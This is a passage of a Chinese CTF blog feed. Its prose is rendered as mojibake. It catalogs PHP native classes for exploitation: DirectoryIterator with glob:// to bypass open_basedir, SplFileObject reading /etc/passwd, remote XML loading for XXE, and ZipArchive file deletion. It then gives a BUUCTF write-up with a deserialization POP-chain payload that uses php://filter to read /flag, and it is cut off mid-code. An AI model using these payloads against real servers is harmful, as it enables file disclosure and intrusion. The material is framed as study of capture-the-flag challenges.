title="Directorylterator"></a>Directorylterator</h1><p>Directorylteratorç±»æä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£</p><p>Directorylteratorä¸glob:&#x2F;&#x2F;åè®®ç»“åˆå°†æ— è§†open_basedirå¯¹ç›®å½•çš„é™åˆ¶ï¼Œå¯ç”¨æ¥åˆ—ä¸¾æŒ‡å®šç›®å½•ä¸‹çš„æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>];<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$dir</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å…¥?whoami&#x3D;glob:&#x2F;&#x2F;&#x2F;*å³å¯åˆ—å‡ºæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶</p><p><img src="/../images/image-20231215161339993.png" alt="image-20231215161339993"></p><h1 id="Filesystemlterator"><a href="#Filesystemlterator" class="headerlink" title="Filesystemlterator"></a>Filesystemlterator</h1><p>ä¸Directorylteratorç±»ç›¸åŒï¼Œæä¾›äº†ä¸€ä¸ªç”¨äºæŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç›®å½•å†…å®¹çš„ç®€å•æ¥å£</p><p>è¯¥ç±»çš„æ„é€ æ–¹æ³•å°†ä¼šåˆ›å»ºä¸€ä¸ªæŒ‡å®šç›®å½•çš„è¿­ä»£å™¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br></code></pre></td></tr></table></figure><h1 id="Globlterator"><a href="#Globlterator" class="headerlink" title="Globlterator"></a>Globlterator</h1><p>ä¸filesystemlteratorå’Œdirectorylteratorä½œç”¨ç±»ä¼¼ï¼Œä¹Ÿå¯ä»¥éå†ä¸€ä¸ªæ–‡ä»¶ç›®å½•ï¼Œä½¿ç”¨æ–¹æ³•ä¸å‰ä¸¤ä¸ªä¹Ÿç±»ä¼¼</p><p>ä¸åŒçš„æ˜¯å…¶è¡Œä¸ºç±»ä¼¼glob()ï¼Œå¯ä»¥é€šè¿‡æ¨¡å¼åŒ¹é…æ¥å¯»æ‰¾æ–‡ä»¶è·¯å¾„</p><p><strong>ç±»æ‘˜è¦</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">GlobIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">FilesystemIterator</span> <span class="hljs-keyword">implements</span> <span class="hljs-built_in">SeekableIterator</span> , <span class="hljs-built_in">Countable</span> &#123;<br>    <span class="hljs-comment">/* æ–¹æ³• */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> )<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">count</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-comment">/* ç»§æ‰¿çš„æ–¹æ³• */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$path</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">KEY_AS_PATHNAME</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">CURRENT_AS_FILEINFO</span> | <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">SKIP_DOTS</span> )<br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">current</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">getFlags</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">key</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">next</span> ( ) : <span class="hljs-keyword">void</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">rewind</span> ( ) : <span class="hljs-keyword">void</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title class_">FilesystemIterator</span>::<span class="hljs-variable constant_">setFlags</span> ( <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = ? ) : <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬çŸ¥é“flagæ–‡ä»¶åœ¨æ ¹ç›®å½•ï¼Œä½†æ˜¯ä¸çŸ¥é“flagæ–‡ä»¶çš„å®Œæ•´åï¼Œå¯ä»¥ä½¿ç”¨Globlterator(&#x2F;<em>flag</em>&#x2F;)</p><p><img src="/../images/20210809203839.png" alt="image-20210809203750996"></p><h1 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a>SimpleXMLElement</h1><p>ç”¨äºè§£æXMLæ–‡æ¡£ä¸­çš„å…ƒç´ </p><p>å®˜æ–¹æ–‡æ¡£å¯¹SimpleXMLElementç±»æ„é€ æ–¹æ³•SimpleXMLElement::__constructå®šä¹‰ï¼š</p><p><img src="/../images/image-20231215162830705.png" alt="image-20231215162830705"></p><p><img src="/../images/image-20231215162844688.png" alt="image-20231215162844688"></p><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸‰ä¸ªå‚æ•°data_is_urlä¸ºtrueï¼Œæˆ‘ä»¬å¯ä»¥å®ç°è¿œç¨‹xmlæ–‡ä»¶çš„è½½å…¥</p><p>ç¬¬äºŒä¸ªå‚æ•°çš„å¸¸é‡å€¼æˆ‘ä»¬è®¾ç½®ä¸º2å³å¯</p><p>ç¬¬ä¸€ä¸ªå‚æ•°dataå°±æ˜¯æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„payloadçš„urlåœ°å€ï¼Œç”¨äºå¼•å…¥å¤–éƒ¨å®ä½“çš„url</p><h1 id="SplFileInfo"><a href="#SplFileInfo" class="headerlink" title="SplFileInfo"></a>SplFileInfo</h1><ul><li>PHP5,7,8</li></ul><p>SplFileInfoç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†é«˜çº§çš„é¢å‘å¯¹è±¡æ¥å£</p><p>SplFileInfo::__toString  å°†æ–‡ä»¶è·¯å¾„ä½œä¸ºå­—ç¬¦ä¸²è¿”å›</p><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h1><p>SplFileObjectç±»ä¸ºå•ä¸ªæ–‡ä»¶çš„ä¿¡æ¯æä¾›äº†ä¸€ä¸ªé«˜çº§çš„é¢å‘å¯¹è±¡çš„æ¥å£ï¼Œå¯ä»¥ç”¨äºå¯¹æ–‡ä»¶å†…å®¹çš„éå†ã€æŸ¥æ‰¾ã€æ“ä½œç­‰</p><p>è¯¥ç±»çš„æ„é€ æ–¹æ³•å¯ä»¥æ„é€ ä¸€ä¸ªæ–°çš„æ–‡ä»¶å¯¹è±¡ç”¨äºåç»­çš„è¯»å–</p><p>PoC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ZipArchive"><a href="#ZipArchive" class="headerlink" title="ZipArchive"></a>ZipArchive</h1><ul><li>PHP&gt;5</li></ul><p>å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©ä¸è§£å‹ç¼©</p><ul><li><code>ZipArchive::addEmptyDir</code>ï¼šæ·»åŠ ä¸€ä¸ªæ–°çš„æ–‡ä»¶ç›®å½•</li><li><code>ZipArchive::addFile</code>ï¼šå°†æ–‡ä»¶æ·»åŠ åˆ°æŒ‡å®šzipå‹ç¼©åŒ…ä¸­</li><li><code>ZipArchive::addFromString</code>ï¼šæ·»åŠ æ–°çš„æ–‡ä»¶åŒæ—¶å°†å†…å®¹æ·»åŠ è¿›å»</li><li><code>ZipArchive::close</code>ï¼šå…³é—­ziparchive</li><li><code>ZipArchive::extractTo</code>ï¼šå°†å‹ç¼©åŒ…è§£å‹</li><li><code>ZipArchive::open</code>ï¼šæ‰“å¼€ä¸€ä¸ªzipå‹ç¼©åŒ…</li><li><code>ZipArchive::deleteIndex</code>ï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶ï¼Œå¦‚ï¼š<code>deleteIndex(0)</code>ä»£è¡¨åˆ é™¤ç¬¬ä¸€ä¸ªæ–‡ä»¶</li><li><code>ZipArchive::deleteName</code>ï¼šåˆ é™¤å‹ç¼©åŒ…ä¸­çš„æŸä¸€ä¸ªæ–‡ä»¶åç§°ï¼ŒåŒæ—¶ä¹Ÿå°†æ–‡ä»¶åˆ é™¤</li></ul><p>æ¥çœ‹çœ‹ZipArchive::openæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">open</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> ] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•ç”¨æ¥æ‰“å¼€ä¸€ä¸ªæ–°çš„æˆ–ç°æœ‰çš„zipå­˜æ¡£è¿›è¡Œè¯»å–ã€å†™å…¥ã€ä¿®æ”¹</p><ul><li><code>$filename</code>ï¼šè¦æ‰“å¼€çš„ZIPå­˜æ¡£çš„æ–‡ä»¶åã€‚</li><li><code>$flags</code>ï¼šç”¨äºæ‰“å¼€æ¡£æ¡ˆçš„æ¨¡å¼ã€‚æœ‰ä»¥ä¸‹å‡ ç§æ¨¡å¼ï¼š</li><li><code>ZipArchive::OVERWRITE</code>ï¼šæ€»æ˜¯ä»¥ä¸€ä¸ªæ–°çš„å‹ç¼©åŒ…å¼€å§‹ï¼Œæ­¤æ¨¡å¼ä¸‹å¦‚æœå·²ç»å­˜åœ¨åˆ™ä¼šè¢«è¦†ç›–æˆ–åˆ é™¤ã€‚</li><li><code>ZipArchive::CREATE</code>ï¼šå¦‚æœä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ªzipå‹ç¼©åŒ…ã€‚</li><li><code>ZipArchive::RDONLY</code>ï¼šåªè¯»æ¨¡å¼æ‰“å¼€å‹ç¼©åŒ…ã€‚</li><li><code>ZipArchive::EXCL</code>ï¼šå¦‚æœå‹ç¼©åŒ…å·²ç»å­˜åœ¨ï¼Œåˆ™å‡ºé”™ã€‚</li><li><code>ZipArchive::CHECKCONS</code>ï¼šå¯¹å‹ç¼©åŒ…æ‰§è¡Œé¢å¤–çš„ä¸€è‡´æ€§æ£€æŸ¥ï¼Œå¦‚æœå¤±è´¥åˆ™æ˜¾ç¤ºé”™è¯¯ã€‚</li></ul><p>å¦‚æœè®¾ç½®flagså€¼ä¸ºZipArchive::OVERWRITEçš„è¯ï¼Œå¯ä»¥åˆ é™¤æŒ‡å®šæ–‡ä»¶</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-variable">$a</span> = new Zip<span class="hljs-params">Archive</span>()<span class="hljs-comment">;</span><br><span class="hljs-variable">$a</span>-&gt;<span class="hljs-literal">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-title function_">ZipArchive::OVERWRITE</span>)<span class="hljs-comment">;  </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;æ–°ç”Ÿèµ›é‡åˆ°äº†ä¸€é“é¢˜éœ€è¦åˆ©ç”¨PHPåŸç”Ÿç±»ï¼Œç”±äºè‡ªå·±å¾ˆèœï¼ŒèŠ±äº†å¾ˆé•¿æ—¶é—´æ‰åšå‡ºæ¥ã€‚è¶å‘¨æœ«æœ‰æ—¶é—´æ€»ç»“ä¸€ä¸‹å¸¸è§çš„PHPåŸç”Ÿç±»&lt;/p&gt;
&lt;ul&gt;
&lt;li</summary>
      
    
    
    
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTFåˆ·é¢˜(æŒç»­æ›´æ–°)</title>
    <link href="http://example.com/2023/12/11/BUUCTF%E5%88%B7%E9%A2%98/"/>
    <id>http://example.com/2023/12/11/BUUCTF%E5%88%B7%E9%A2%98/</id>
    <published>2023-12-11T13:23:16.000Z</published>
    <updated>2023-12-19T12:51:33.830Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NISACTF-2022-popchains"><a href="#NISACTF-2022-popchains" class="headerlink" title="[NISACTF 2022]popchains"></a>[NISACTF 2022]popchains</h1><p>ç›´æ¥å®¡è®¡ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Happy New Year~ MAKE A WISH</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Happy New Year~ MAKE A WISH&lt;br&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;wish&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/***************************pop your 2022*****************************/</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;effort = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**********************Try to See flag.php*****************************/</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ‰¾å¯ä»¥åˆ©ç”¨çš„ç‚¹</p><p>å‘ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//åŒ…å«</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œå†æ‰¾å“ªé‡Œè°ƒç”¨äº†append()å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åªè¦è§¦å‘__invoke()æ–¹æ³•ï¼Œå°±èƒ½è°ƒç”¨append()å‡½æ•°ï¼Œå¹¶ä¸”ä¼ å‚var</p><p>è¦è§¦å‘__invoke()æ–¹æ³•å¿…é¡»ä½¿å¯¹è±¡è¢«å½“ä½œå‡½æ•°è°ƒç”¨</p><p><strong>Make_a_Change</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;effort;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡ŒæŠŠ$functionå½“ä½œå‡½æ•°è°ƒç”¨ï¼Œä½†æ˜¯è¦è§¦å‘__get()æ–¹æ³•ï¼Œéœ€è¦<strong>è®¿é—®ä¸€ä¸ªå¯¹è±¡ä¸å­˜åœ¨æˆ–ä¸å¯è®¿é—®çš„å±æ€§</strong></p><p><strong>Road_is_Long</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>-&gt;page;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ$this-&gt;string&#x3D;Make_a_Changeçš„è¯ï¼Œé‚£ä¹ˆMake_a_Change-&gt;pageä¹Ÿå°±è®¿é—®äº†å…¶ä¸å­˜åœ¨çš„å±æ€§</p><p>è§¦å‘__toString()éœ€è¦<strong>ç±»è¢«å½“ä½œå­—ç¬¦ä¸²</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;  <span class="comment">//ååºåˆ—åŒ–åæ‰§è¡Œ</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/file|ftp|http|https|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;page)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You can Not Enter 2022&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;page = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Road_is_Long</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$page</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$String</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Try_Work_Hard</span></span>&#123;</span><br><span class="line">protectecd <span class="variable">$var</span>=<span class="string">&quot;php://filter/convert.base64-encode/resource=/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Make_a_Change</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$effort</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Road_is_Long</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">Try_Work_Hard</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title class_">Make_a_Change</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;effort=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;String=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;page=<span class="variable">$a</span>;</span><br></pre></td></tr></table></figure><h1 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ"><a href="#GXYCTF2019-ç¦æ­¢å¥—å¨ƒ" class="headerlink" title="[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ"></a>[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ</h1><p>è®¿é—®</p><p><img src="/../images/image-20231114092252163.png" alt="image-20231114092252163"></p><p>dirsearchæ‰«ç›®å½•</p><p><img src="/../images/image-20231114092318009.png" alt="image-20231114092318009"></p><p>.gitæ³„éœ²ï¼Œä¸ŠGithackï¼Œä¸‹è½½åˆ°index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span 